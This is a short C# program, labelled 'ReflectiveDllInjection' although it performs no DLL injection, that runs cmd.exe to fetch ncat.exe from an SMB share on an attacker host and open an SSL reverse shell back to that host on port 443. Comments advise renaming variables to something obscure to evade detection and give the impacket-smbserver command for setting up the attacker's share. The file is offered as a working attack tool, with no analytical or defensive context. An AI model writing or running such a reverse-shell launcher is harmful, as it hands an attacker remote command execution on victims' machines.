using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ReflectiveDllInjection
{
    public class ReflectiveDllInjection
    {
        public static void Main()
        {

            // Rename varialbes to something obscure
            // Replace IP
            String host = "192.168.16.1";
            int port = 443;
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";

            // Set up share on Attacker
            //Ex. impacket-smbserver share . -smb2support -username user -password password
            p.StartInfo.Arguments = "/c \\\\" + host + "\\share\ncat.exe " + host + " " + port + " -e cmd.exe --ssl";
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

        }

    }
}